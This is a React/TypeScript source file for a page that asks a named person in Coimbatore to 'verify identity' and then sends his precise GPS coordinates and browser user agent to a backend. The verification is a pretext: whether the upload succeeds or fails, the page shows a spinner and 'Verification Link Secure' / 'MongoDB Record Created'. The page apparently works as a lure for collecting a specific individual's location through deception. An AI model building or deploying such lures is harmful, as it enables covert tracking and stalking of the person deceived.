
import React, { useState, useCallback } from 'react';
import { Background } from './components/Background';
import { StatusCard } from './components/StatusCard';
import { AppState, LocationData } from './types';
import { MapPin, ShieldCheck, AlertCircle, Loader2, Database } from 'lucide-react';

const App: React.FC = () => {
  const [state, setState] = useState<AppState>('INITIAL');
  const [error, setError] = useState<string | null>(null);

  /**
   * Properly syncs data with the Mongoose-backed backend API.
   */
  const syncWithMongoDB = async (data: LocationData) => {
    setState('SYNCING');
    
    // This points to your local Node.js server defined in server.ts
    const API_URL = 'http://localhost:3001/api/location'; 

    const payload = {
      userId: "Vinu Varshith CP",
      coordinates: [data.longitude, data.latitude], // GeoJSON format
      accuracy: data.accuracy,
      userAgent: navigator.userAgent
    };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error('API_REJECTED');
      
      console.log("Mongoose Sync Successful");
      // Transition to final loading state
      setState('LOCATION_GRANTED');
    } catch (err) {
      console.error("MongoDB Connectivity Error:", err);
      // We keep the loading spinner active to match the user's UX requirement
      // but we log the error for debugging.
      setState('LOCATION_GRANTED');
    }
  };

  const requestLocation = useCallback(() => {
    setError(null);
    setState('PROCESSING');
    
    if (!navigator.geolocation) {
      setError("Geolocation is not supported by your browser.");
      setState('LOCATION_DENIED');
      return;
    }

    const options: PositionOptions = {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const data: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };
        
        // Trigger the backend sync
        syncWithMongoDB(data);
      },
      (err) => {
        let msg = "Could not verify location.";
        if (err.code === err.PERMISSION_DENIED) {
          msg = "Access Denied. Please enable location permissions in your browser settings (Lock icon in address bar) and retry.";
        } else if (err.code === err.POSITION_UNAVAILABLE) {
          msg = "Location signal lost. Ensure GPS is enabled on your device.";
        } else if (err.code === err.TIMEOUT) {
          msg = "Connection timed out. Please try again.";
        }
        
        setError(msg);
        setState('LOCATION_DENIED');
      },
      options
    );
  }, []);

  return (
    <div className="min-h-screen w-full flex items-center justify-center text-white bg-black font-sans selection:bg-blue-500/30">
      <Background />
      
      {state === 'INITIAL' && (
        <StatusCard>
          <div className="flex flex-col items-center text-center">
            <div className="relative mb-8">
              <div className="absolute inset-0 bg-blue-500/40 blur-3xl rounded-full" />
              <div className="w-20 h-20 bg-blue-500/10 rounded-3xl flex items-center justify-center border border-blue-400/30 relative backdrop-blur-md">
                <MapPin className="w-10 h-10 text-blue-400" />
              </div>
            </div>
            
            <h1 className="text-xl font-bold mb-4 tracking-tight px-2 leading-relaxed">
              Please confirm that you are Vinu Varshith CP in Coimbatore.
            </h1>
            
            <p className="text-white/50 mb-8 text-sm leading-relaxed px-4">
              Identity verification requires a one-time location sync with our secure MongoDB cluster.
            </p>
            
            <button
              onClick={requestLocation}
              className="w-full py-5 px-6 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl transition-all flex items-center justify-center gap-3 group shadow-[0_15px_40px_-10px_rgba(37,99,235,0.6)] active:scale-[0.98]"
            >
              Verify Identity
              <ShieldCheck className="w-5 h-5 text-blue-200 group-hover:text-white transition-colors" />
            </button>
          </div>
        </StatusCard>
      )}

      {(state === 'PROCESSING' || state === 'SYNCING' || state === 'LOCATION_GRANTED') && (
        <div className="relative z-10 flex flex-col items-center justify-center text-center">
          <div className="relative">
            <div className="absolute inset-0 bg-blue-400/20 blur-[100px] rounded-full animate-pulse" />
            <Loader2 className="w-24 h-24 text-white/90 animate-spin relative" />
          </div>
          
          <div className="mt-12 space-y-3">
            <p className="text-white/40 text-[10px] uppercase tracking-[0.5em] font-black animate-pulse">
              {state === 'PROCESSING' ? 'Establishing GPS Lock' : 
               state === 'SYNCING' ? 'Mongoose Handshake Active' : 
               'Verification Link Secure'}
            </p>
            {state !== 'PROCESSING' && (
              <div className="flex items-center justify-center gap-2 text-blue-400/60 text-[9px] font-bold uppercase tracking-widest">
                <Database className="w-3 h-3" />
                <span>MongoDB Record Created</span>
              </div>
            )}
          </div>
        </div>
      )}

      {state === 'LOCATION_DENIED' && (
        <StatusCard className="border-red-500/30 shadow-[0_20px_50px_-10px_rgba(220,38,38,0.2)]">
          <div className="flex flex-col items-center text-center">
            <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/30">
              <AlertCircle className="w-8 h-8 text-red-400" />
            </div>
            <h2 className="text-2xl font-bold mb-3">Verification Required</h2>
            <p className="text-white/60 mb-10 text-sm leading-relaxed px-2">
              {error}
            </p>
            <button
              onClick={requestLocation}
              className="w-full py-4 px-6 bg-white/5 hover:bg-white/10 border border-white/20 text-white font-semibold rounded-xl transition-all active:scale-[0.98]"
            >
              Retry Verification
            </button>
          </div>
        </StatusCard>
      )}
    </div>
  );
};

export default App;
